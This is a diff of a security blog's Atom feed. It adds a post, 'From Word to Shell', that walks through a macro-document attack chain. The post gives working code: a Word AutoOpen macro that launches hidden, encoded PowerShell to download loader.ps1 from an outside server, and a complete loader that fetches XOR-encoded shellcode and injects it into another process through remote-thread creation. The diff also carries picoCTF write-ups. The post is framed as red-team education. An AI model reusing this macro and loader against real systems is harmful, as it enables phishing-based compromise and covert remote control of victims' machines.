@@ -1,4 +1,339 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2025-07-01T15:05:30-04:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Big Brooklyn</title><subtitle>Cybersecurity Blog + Portfolio</subtitle><author><name>Big Brooklyn</name><email>you@protonmail.com</email></author><entry><title type="html">MBR and GPT</title><link href="http://localhost:4000/blog/MBR-GPT/" rel="alternate" type="text/html" title="MBR and GPT" /><published>2025-07-01T00:00:00-04:00</published><updated>2025-07-01T00:00:00-04:00</updated><id>http://localhost:4000/blog/MBR-GPT</id><content type="html" xml:base="http://localhost:4000/blog/MBR-GPT/"><![CDATA[<h1 id="understanding-mbr-and-gpt-the-foundation-of-disk-partitioning">Understanding MBR and GPT: The Foundation of Disk Partitioning</h1>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2025-07-05T15:33:06-04:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Big Brooklyn</title><subtitle>Cybersecurity Blog + Portfolio</subtitle><author><name>Big Brooklyn</name><email>you@protonmail.com</email></author><entry><title type="html">From Word to Shell</title><link href="http://localhost:4000/blog/From_Word_to_Shell/" rel="alternate" type="text/html" title="From Word to Shell" /><published>2025-07-05T00:00:00-04:00</published><updated>2025-07-05T00:00:00-04:00</updated><id>http://localhost:4000/blog/CA</id><content type="html" xml:base="http://localhost:4000/blog/From_Word_to_Shell/"><![CDATA[<h2 id="introduction">Introduction</h2>
+
+<p>In today’s threat landscape, sophisticated adversaries often leverage social engineering and weaponized documents as their initial attack vector. Understanding how these attacks unfold is crucial for organizations to strengthen their security posture against real-world attack scenarios. By analyzing the tactics, techniques, and procedures (TTPs) of actual threat actors, security professionals can gain invaluable insights into defensive gaps and help build stronger security resilience.</p>
+
+<p>One of the most prevalent initial access methods observed in the wild is phishing campaigns utilizing malicious Microsoft Office documents. These attacks prey on human psychology and the ubiquitous nature of office productivity suites in corporate environments. A seemingly innocent resume or business proposal can quickly become the gateway for sophisticated malware deployment.</p>
+
+<p>In this demonstration, we’ll walk through how a typical adversary attack chain weaponizes everyday documents to establish persistent command and control channels. Our scenario showcases how attackers would leverage:</p>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*gTGRh3hxQUamJ1ubAZnvAg.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
+
+<ol>
+  <li><strong>Initial Payload</strong>: A weaponized Word document (<code class="language-plaintext highlighter-rouge">Resume.docm</code>) containing an embedded VBA macro</li>
+  <li><strong>Loader Mechanism</strong>: A PowerShell-based loader (<code class="language-plaintext highlighter-rouge">loader.ps1</code>) designed to retrieve and execute additional payloads</li>
+  <li><strong>Encoded Shellcode</strong>: XOR-encoded shellcode (<code class="language-plaintext highlighter-rouge">demon_encoded.x64.bin</code>) hosted on the attacker’s infrastructure</li>
+  <li><strong>Command &amp; Control</strong>: A Havoc C2 framework providing post-exploitation capabilities</li>
+</ol>
+
+<p>This attack chain demonstrates several key techniques commonly observed in real-world intrusions: macro-enabled document exploitation, fileless execution through PowerShell, payload encoding for evasion, and in-memory shellcode execution to avoid disk-based detection mechanisms.</p>
+
+<p><strong>Disclaimer</strong>: This content is intended for educational and authorized security testing purposes only. The techniques demonstrated should only be used in controlled environments with proper authorization.</p>
+
+<p>Let’s dive into the technical implementation of this attack simulation…</p>
+
+<h2 id="initial-payload-the-trojan-horse">Initial Payload: The Trojan Horse</h2>
+
+<p>At first glance, our weaponized document appears as an innocent resume the perfect social engineering lure. However, beneath this benign facade lies a sophisticated attack mechanism waiting to be unleashed. This is the digital equivalent of a Trojan horse, designed to exploit the most vulnerable component in any security infrastructure: human trust.</p>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*mffm9ovgQnbsiraATbvCtw.png" alt="Malicious Word Document Interface" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
+
+<p>The document leverages Microsoft Word’s macro functionality, a legitimate feature that becomes a powerful attack vector in the wrong hands. When a victim opens the document and enables macros often prompted by social engineering text claiming the document is “protected” or “encrypted” the embedded VBA code springs into action.</p>
+
+<p>Use <code class="language-plaintext highlighter-rouge">Alt + F11</code> to access the VBA editor and examine the macro code hidden within any <code class="language-plaintext highlighter-rouge">.docm</code> file.</p>
+
+<h4 id="macro-activation-the-point-of-no-return">Macro Activation: The Point of No Return</h4>
+
+<p>Once the user clicks “Enable Content,” the malicious macro executes silently in the background. This moment represents the initial compromise the attacker has successfully breached the perimeter and established their first foothold within the target environment.</p>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*Jx5dsetB4eWCK4Dy7qdQfA.png" alt="Macro Execution Warning" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
+
+<p>The macro serves as the catalyst for the entire attack chain, initiating a carefully orchestrated sequence of events that will ultimately result in a fully compromised system under adversarial control.</p>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">VBA</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="VBA">
+Sub AutoOpen()
+    Dim b64 As String
+    b64 = "aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADIAMAAzAC4AMQAzADAAOgA4ADAAMAAwAC8AbABvAGEAZABlAHIALgBwAHMAMQAnACkA"
+    Dim cmd As String
+    cmd = "powershell -w hidden -nop -enc " &amp; b64
+    Shell cmd, vbHide
+End Sub
+</code></pre>
+</div>
+
+<h4 id="breaking-down-the-malicious-code">Breaking Down the Malicious Code</h4>
+
+<p>Let’s dissect this deceptively simple yet devastating piece of VBA code:</p>
+
+<p><strong><code class="language-plaintext highlighter-rouge">Sub AutoOpen()</code></strong><br />
+This is the entry point that executes automatically when the Word document is opened and macros are enabled. The <code class="language-plaintext highlighter-rouge">AutoOpen()</code> function is a built-in Word macro trigger that requires no user interaction beyond the initial “Enable Content” click.</p>
+
+<p><strong>Base64 Encoded Payload</strong><br />
+The variable <code class="language-plaintext highlighter-rouge">b64</code> contains a Base64-encoded Unicode string. When decoded, this reveals:</p>
+<div class="code-block-container">
+  <span class="code-lang-tag">VBA</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="VBA">
+iex (New-Object Net.WebClient).DownloadString('http://192.168.203.130:8000/loader.ps1')
+</code></pre>
+</div>
+
+<p><strong>PowerShell Execution</strong><br />
+The macro constructs a PowerShell command with specific evasion parameters:</p>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">-w hidden</code>: Runs PowerShell with a hidden window to avoid detection</li>
+  <li><code class="language-plaintext highlighter-rouge">-nop</code>: Disables PowerShell profiles that might contain security restrictions</li>
+  <li><code class="language-plaintext highlighter-rouge">-enc</code>: Executes the Base64-encoded command directly</li>
+</ul>
+
+<p><strong>Silent Execution</strong><br />
+Finally, <code class="language-plaintext highlighter-rouge">Shell cmd, vbHide</code> launches the PowerShell process invisibly in the background, making the attack completely transparent to the victim.</p>
+
+<p>This elegant yet malicious code demonstrates how attackers can weaponize legitimate Office features to establish initial access with minimal detection risk.</p>
+
+<h2 id="loader-mechanism--encoded-shellcode">Loader Mechanism &amp; Encoded Shellcode</h2>
+
+<p>With the macro successfully executed, the attack chain progresses to its next critical phase. The PowerShell command initiates an HTTP GET request to the attacker’s infrastructure, specifically targeting the <code class="language-plaintext highlighter-rouge">loader.ps1</code> script hosted on <code class="language-plaintext highlighter-rouge">192.168.203.130:8000</code>.</p>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*cEoAvHAbFUsNAGb9c2yvpQ.png" alt="Macro Execution Warning" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
+
+<h3 id="the-cascading-download-chain">The Cascading Download Chain</h3>
+
+<p>Once the victim opens the Word document and activates the macro, a sophisticated multi-stage payload delivery unfolds:</p>
+
+<p><strong>Stage 1: Initial Callback</strong><br />
+The compromised system makes an HTTP GET request to retrieve <code class="language-plaintext highlighter-rouge">loader.ps1</code> from the attacker’s web server. This PowerShell script serves as the secondary payload loader, designed to orchestrate the next phase of the attack.</p>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">Loader.ps1</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="Loader.ps1">
+$sc_enc = Invoke-WebRequest -Uri "http://192.168.203.130:8000/demon_encoded.x64.bin" -UseBasicParsing
+$xorKey = 0xAA
+$shellcode = for ($i = 0; $i -lt $sc_enc.Content.Length; $i++) {
+    $sc_enc.Content[$i] -bxor $xorKey
+}
+
+$blacklist = @(
+    "System", "Idle", "csrss", "wininit", "smss", "winlogon",
+    "services", "lsass", "svchost", "fontdrvhost", "dllhost", "sihost"
+)
+
+# === Step 3: Filter candidate processes owned by user ===
+$myUser = whoami
+$candidates = Get-Process | Where-Object {
+    $_.MainWindowHandle -ne 0 -and
+    $_.ProcessName -notin $blacklist -and
+    ($_.Path -ne $null) -and
+    ($_.StartInfo -ne $null) -and
+    ($_.StartTime -ne $null)
+}
+
+if ($candidates.Count -eq 0) {
+    $candidates = Get-Process | Where-Object {
+        $_.ProcessName -notin $blacklist -and $_.Path -ne $null
+    }
+}
+
+$targetProc = $candidates | Sort-Object -Property Id | Select-Object -First 1
+$targetPID = $targetProc.Id
+Write-Host "[*] Selected process: $($targetProc.ProcessName) (PID: $targetPID)"
+
+$signature = @"
+[DllImport("kernel32.dll", SetLastError = true)]
+public static extern IntPtr OpenProcess(UInt32 processAccess, bool bInheritHandle, int processId);
+
+[DllImport("kernel32.dll", SetLastError = true)]
+public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+
+[DllImport("kernel32.dll", SetLastError = true)]
+public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] buffer, uint size, out UIntPtr lpNumberOfBytesWritten);
+
+[DllImport("kernel32.dll", SetLastError = true)]
+public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+"@
+
+$kernel32 = Add-Type -MemberDefinition $signature -Name "Kernel32" -Namespace "Win32" -PassThru
+
+$PROCESS_ALL_ACCESS = 0x1F0FFF
+$MEM_COMMIT = 0x1000
+$PAGE_EXECUTE_READWRITE = 0x40
+
+$hProcess = $kernel32::OpenProcess($PROCESS_ALL_ACCESS, $false, $targetPID)
+if ($hProcess -eq [IntPtr]::Zero) {
+    Write-Error "[-] Could not open target process (PID: $targetPID)"
+    exit
+}
+
+
+$alloc = $kernel32::VirtualAllocEx($hProcess, [IntPtr]::Zero, $shellcode.Length, $MEM_COMMIT, $PAGE_EXECUTE_READWRITE)
+if ($alloc -eq [IntPtr]::Zero) {
+    Write-Error "[-] Memory allocation failed"
+    exit
+}
+
+$written = [UIntPtr]::Zero
+$success = $kernel32::WriteProcessMemory($hProcess, $alloc, $shellcode, $shellcode.Length, [ref]$written)
+if (-not $success) {
+    Write-Error "[-] Failed to write shellcode to process"
+    exit
+}
+
+$thread = $kernel32::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $alloc, [IntPtr]::Zero, 0, [IntPtr]::Zero)
+if ($thread -eq [IntPtr]::Zero) {
+    Write-Error "[-] Failed to create remote thread"
+} else {
+    Write-Host "[+] Shellcode successfully injected into PID $targetPID ($($targetProc.ProcessName))"
+}
+</code></pre>
+</div>
+
+<h3 id="dissecting-the-powershell-loader">Dissecting the PowerShell Loader</h3>
+
+<p>Let’s break down each component:</p>
+
+<h4 id="payload-retrieval--decoding">Payload Retrieval &amp; Decoding</h4>
+<div class="code-block-container">
+  <span class="code-lang-tag">Loader.ps1</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="Loader.ps1">
+$sc_enc = Invoke-WebRequest -Uri "http://192.168.203.130:8000/demon_encoded.x64.bin" -UseBasicParsing
+$xorKey = 0xAA
+$shellcode = for ($i = 0; $i -lt $sc_enc.Content.Length; $i++) {
+    $sc_enc.Content[$i] -bxor $xorKey
+}
+</code></pre>
+</div>
+
+<p>The script first downloads the XOR-encoded shellcode from the attacker’s server. The <code class="language-plaintext highlighter-rouge">-UseBasicParsing</code> flag ensures compatibility across different PowerShell versions. Each byte is then XORed with the key <code class="language-plaintext highlighter-rouge">0xAA</code> to decode the original shellcode.</p>
+
+<h4 id="process-selection-strategy">Process Selection Strategy</h4>
+<div class="code-block-container">
+  <span class="code-lang-tag">Loader.ps1</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="Loader.ps1">
+$blacklist = @(
+    "System", "Idle", "csrss", "wininit", "smss", "winlogon",
+    "services", "lsass", "svchost", "fontdrvhost", "dllhost", "sihost"
+)
+</code></pre>
+</div>
+
+<p>The script implements a sophisticated process selection mechanism by:</p>
+<ul>
+  <li><strong>Blacklisting critical system processes</strong> to avoid system instability</li>
+  <li><strong>Prioritizing processes with window handles</strong> (indicating user applications)</li>
+  <li><strong>Filtering for user-owned processes</strong> to reduce privilege escalation requirements</li>
+  <li><strong>Selecting the lowest PID</strong> for consistency and stealth</li>
+</ul>
+
+<h4 id="windows-api-integration">Windows API Integration</h4>
+<div class="code-block-container">
+  <span class="code-lang-tag">Loader.ps1</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="Loader.ps1">
+$signature = @"
+[DllImport("kernel32.dll", SetLastError = true)]
+public static extern IntPtr OpenProcess(UInt32 processAccess, bool bInheritHandle, int processId);
+
+[DllImport("kernel32.dll", SetLastError = true)]
+public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+
+[DllImport("kernel32.dll", SetLastError = true)]
+public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] buffer, uint size, out UIntPtr lpNumberOfBytesWritten);
+
+[DllImport("kernel32.dll", SetLastError = true)]
+public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+"@
+
+$kernel32 = Add-Type -MemberDefinition $signature -Name "Kernel32" -Namespace "Win32" -PassThru
+
+$PROCESS_ALL_ACCESS = 0x1F0FFF
+$MEM_COMMIT = 0x1000
+$PAGE_EXECUTE_READWRITE = 0x40
+
+$hProcess = $kernel32::OpenProcess($PROCESS_ALL_ACCESS, $false, $targetPID)
+if ($hProcess -eq [IntPtr]::Zero) {
+    Write-Error "[-] Could not open target process (PID: $targetPID)"
+    exit
+}
+
+
+$alloc = $kernel32::VirtualAllocEx($hProcess, [IntPtr]::Zero, $shellcode.Length, $MEM_COMMIT, $PAGE_EXECUTE_READWRITE)
+if ($alloc -eq [IntPtr]::Zero) {
+    Write-Error "[-] Memory allocation failed"
+    exit
+}
+
+$written = [UIntPtr]::Zero
+$success = $kernel32::WriteProcessMemory($hProcess, $alloc, $shellcode, $shellcode.Length, [ref]$written)
+if (-not $success) {
+    Write-Error "[-] Failed to write shellcode to process"
+    exit
+}
+
+$thread = $kernel32::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $alloc, [IntPtr]::Zero, 0, [IntPtr]::Zero)
+if ($thread -eq [IntPtr]::Zero) {
+    Write-Error "[-] Failed to create remote thread"
+} else {
+    Write-Host "[+] Shellcode successfully injected into PID $targetPID ($($targetProc.ProcessName))"
+}
+</code></pre>
+</div>
+
+<p><strong>Stage 2: Shellcode Retrieval</strong><br />
+The loader script subsequently requests <code class="language-plaintext highlighter-rouge">demon_encoded.x64.bin</code> an XOR encoded shellcode payload. This encoding technique serves multiple purposes:</p>
+<ul>
+  <li><strong>Evasion</strong>: Bypasses signature-based detection mechanisms</li>
+  <li><strong>Obfuscation</strong>: Hides the true nature of the payload during transit</li>
+  <li><strong>Anti-Analysis</strong>: Complicates reverse engineering efforts</li>
+</ul>
+
+<p><strong>Stage 3: In-Memory Execution</strong><br />
+Upon successful retrieval, the loader decodes the XOR-encrypted shellcode and executes it directly in memory, avoiding disk-based artifacts that could trigger security solutions.</p>
+
+<h3 id="establishing-command--control">Establishing Command &amp; Control</h3>
+
+<p>The decoded shellcode establishes a reverse connection back to the attacker’s Havoc C2 framework, completing the initial compromise phase. This connection provides the adversary with:</p>
+
+<ul>
+  <li><strong>Remote Command Execution</strong>: Full shell access to the compromised system</li>
+  <li><strong>Persistence Mechanisms</strong>: Ability to maintain long-term access</li>
+  <li><strong>Lateral Movement</strong>: Capability to expand access within the network</li>
+  <li><strong>Data Exfiltration</strong>: Channels for stealing sensitive information</li>
+</ul>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*VKIVFhOzqlVc_Cu_iFH4DQ.png" alt="Macro Execution Warning" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
+
+<p>This multi-stage approach demonstrates the sophistication of modern attack chains, where each component serves a specific purpose in achieving the ultimate objective: establishing persistent, covert access to the target environment.</p>
+
+<h2 id="attack-chain-demonstration-">Attack Chain Demonstration :</h2>
+
+<div class="video-container">
+  <iframe width="560" height="315" src="https://www.youtube.com/embed/xDyXdwFavjs" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>
+</div>]]></content><author><name>Big Brooklyn</name><email>you@protonmail.com</email></author><category term="blog" /><category term="cybersecurity" /><category term="Redteam" /><category term="pentesting" /><category term="bugbounty" /><category term="ctf" /><summary type="html"><![CDATA[Introduction]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*TUgLYGTVbEwTHH2X4tKSHA.jpeg" /><media:content medium="image" url="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*TUgLYGTVbEwTHH2X4tKSHA.jpeg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">MBR and GPT</title><link href="http://localhost:4000/blog/MBR-GPT/" rel="alternate" type="text/html" title="MBR and GPT" /><published>2025-07-01T00:00:00-04:00</published><updated>2025-07-01T00:00:00-04:00</updated><id>http://localhost:4000/blog/MBR-GPT</id><content type="html" xml:base="http://localhost:4000/blog/MBR-GPT/"><![CDATA[<h1 id="understanding-mbr-and-gpt-the-foundation-of-disk-partitioning">Understanding MBR and GPT: The Foundation of Disk Partitioning</h1>
 
 <p>When it comes to data storage and system boot processes, two fundamental partition schemes dominate the landscape: <strong>Master Boot Record (MBR)</strong> and <strong>GUID Partition Table (GPT)</strong>. These critical components reside in the very first sector of a disk and contain essential information about the disk’s structure, partitions, and organization. Beyond simple data management, they play a pivotal role in the system boot process, making them both essential for legitimate operations and attractive targets for malicious actors.</p>
 
@@ -3309,357 +3644,4 @@ I installed <code class="language-plaintext highlighter-rouge">zsteg</code> (sin
 After decoding the base64 string several times, I finally obtained the flag!</li>
 </ol>
 
-<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*24UtVzAOhW9l80TZJ0ioZQ.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>]]></content><author><name>Big Brooklyn</name><email>you@protonmail.com</email></author><category term="blog" /><category term="cybersecurity" /><category term="red team" /><category term="pentesting" /><category term="bug bounty" /><category term="ctf" /><summary type="html"><![CDATA[Challenge: RED (PicoCTF) Description: RED, RED, RED, RED Download: red.png]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://e1.pxfuel.com/desktop-wallpaper/346/328/desktop-wallpaper-grim-reaper-backgrounds-grim-reaper.jpg" /><media:content medium="image" url="https://e1.pxfuel.com/desktop-wallpaper/346/328/desktop-wallpaper-grim-reaper-backgrounds-grim-reaper.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Quantum Scrambler (PicoCTF)</title><link href="http://localhost:4000/blog/cybersecurity/2025/06/05/QuantumScrambler.html" rel="alternate" type="text/html" title="Quantum Scrambler (PicoCTF)" /><published>2025-06-05T00:00:00-04:00</published><updated>2025-06-05T00:00:00-04:00</updated><id>http://localhost:4000/blog/cybersecurity/2025/06/05/QuantumScrambler</id><content type="html" xml:base="http://localhost:4000/blog/cybersecurity/2025/06/05/QuantumScrambler.html"><![CDATA[<h1 id="reverse-engineering-a-recursive-scramble-in-python-picoctf-challenge-breakdown">Reverse Engineering a Recursive Scramble in Python picoCTF Challenge Breakdown</h1>
-
-<hr />
-
-<h2 id="introduction">Introduction</h2>
-
-<p>In this challenge, we’re handed a Python script that scrambles a flag using a bizarre in-place list mutation with nested references making direct decoding tricky.</p>
-
-<p>Our mission: understand the scramble, decode the nested structure, and extract the original flag.</p>
-
-<hr />
-
-<h4 id="description">Description</h4>
-<p>We invented a new cypher that uses “quantum entanglement” to encode the flag. Do you have what it takes to decode it?</p>
-
-<h2 id="the-challenge-code">The Challenge Code</h2>
-
-<div class="code-block-container">
-  <span class="code-lang-tag">Python</span>
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-python">
-import sys
-
-def exit():
-  sys.exit(0)
-
-def scramble(L):
-  A = L
-  i = 2
-  while (i &lt; len(A)):
-    A[i-2] += A.pop(i-1)
-    A[i-1].append(A[:i-2])
-    i += 1
-    
-  return L
-
-def get_flag():
-  flag = open('flag.txt', 'r').read()
-  flag = flag.strip()
-  hex_flag = []
-  for c in flag:
-    hex_flag.append([str(hex(ord(c)))])
-
-  return hex_flag
-
-def main():
-  flag = get_flag()
-  cypher = scramble(flag)
-  print(cypher)
-
-if __name__ == '__main__':
-  main()
-</code></pre>
-</div>
-
-<p>Here’s the core part:</p>
-
-<div class="code-block-container">
-  <span class="code-lang-tag">Python</span>
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-python">
-def scramble(L):
-    A = L
-    i = 2
-    while (i &lt; len(A)):
-        A[i-2] += A.pop(i-1)
-        A[i-1].append(A[:i-2])
-        i += 1
-    return L
-
-def get_flag():
-    flag = open('flag.txt', 'r').read().strip()
-    hex_flag = [[hex(ord(c))] for c in flag]
-    return hex_flag
-
-def main():
-    flag = get_flag()
-    cypher = scramble(flag)
-    print(cypher)
-
-</code></pre>
-</div>
-
-<hr />
-
-<h2 id="whats-happening-here">What’s happening here?</h2>
-
-<h3 id="step-1-preparing-the-flag">Step 1: Preparing the flag</h3>
-
-<ul>
-  <li>
-    <p>The flag is read from <code class="language-plaintext highlighter-rouge">flag.txt</code>.</p>
-  </li>
-  <li>
-    <p>Each character is converted to its hexadecimal ASCII code string, wrapped in a list.</p>
-
-    <ul>
-      <li>Example: <code class="language-plaintext highlighter-rouge">'p'</code> → <code class="language-plaintext highlighter-rouge">['0x70']</code></li>
-    </ul>
-  </li>
-  <li>
-    <p>So the flag becomes a list of lists:<br />
-<code class="language-plaintext highlighter-rouge">[['0x70'], ['0x69'], ['0x63'], ['0x6f'], ...]</code></p>
-  </li>
-</ul>
-
-<h3 id="step-2-the-scramble-function--the-chaos-begins">Step 2: The scramble function — the chaos begins</h3>
-
-<div class="code-block-container">
-  <span class="code-lang-tag">Python</span>
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-python">
-def scramble(L):
-    A = L
-    i = 2
-    while (i &lt; len(A)):
-        A[i-2] += A.pop(i-1)
-        A[i-1].append(A[:i-2])
-        i += 1
-    return L
-</code></pre>
-</div>
-
-<ul>
-  <li>
-    <p><code class="language-plaintext highlighter-rouge">A</code> is a reference to the original list <code class="language-plaintext highlighter-rouge">L</code> (no copy).</p>
-  </li>
-  <li>
-    <p><code class="language-plaintext highlighter-rouge">i</code> starts at 2, loops while less than length of <code class="language-plaintext highlighter-rouge">A</code>.</p>
-  </li>
-  <li>
-    <p>Each iteration:</p>
-
-    <ul>
-      <li>
-        <p><code class="language-plaintext highlighter-rouge">A.pop(i-1)</code> removes the element at index <code class="language-plaintext highlighter-rouge">i-1</code> and returns it.</p>
-      </li>
-      <li>
-        <p>The popped element (a list like <code class="language-plaintext highlighter-rouge">['0x69']</code>) is <strong>concatenated (<code class="language-plaintext highlighter-rouge">+=</code>) to <code class="language-plaintext highlighter-rouge">A[i-2]</code></strong> — so two lists merge.</p>
-      </li>
-      <li>
-        <p>Then, a <strong>slice of the list <code class="language-plaintext highlighter-rouge">A[:i-2]</code></strong> (everything before <code class="language-plaintext highlighter-rouge">i-2</code>) is appended as a nested list inside <code class="language-plaintext highlighter-rouge">A[i-1]</code>.</p>
-      </li>
-      <li>
-        <p><code class="language-plaintext highlighter-rouge">i</code> increments by 1.</p>
-      </li>
-    </ul>
-  </li>
-  <li>
-    <p>The list shrinks by one each iteration because of <code class="language-plaintext highlighter-rouge">.pop()</code>.</p>
-  </li>
-</ul>
-
-<hr />
-
-<h2 id="what-does-this-scrambling-actually-do">What does this scrambling actually do?</h2>
-
-<ol>
-  <li>
-    <p>It merges adjacent elements, combining the hex codes into growing lists.</p>
-  </li>
-  <li>
-    <p>It appends nested slices of earlier parts of the list as <em>recursive references</em> inside other list elements.</p>
-  </li>
-  <li>
-    <p>The nested slices are <strong>not flat copies</strong>, but <em>references</em> to parts of the list.</p>
-  </li>
-</ol>
-
-<hr />
-
-<h2 id="why-does-this-matter">Why does this matter?</h2>
-
-<ul>
-  <li>
-    <p>The final structure is a <strong>deeply nested recursive list</strong>, with references to earlier parts of itself.</p>
-  </li>
-  <li>
-    <p>This creates a complex graph-like structure, <strong>not a simple list of hex strings</strong>.</p>
-  </li>
-  <li>
-    <p>Naively flattening or recursively joining all elements will <strong>repeat parts multiple times</strong> or enter infinite loops.</p>
-  </li>
-</ul>
-
-<hr />
-
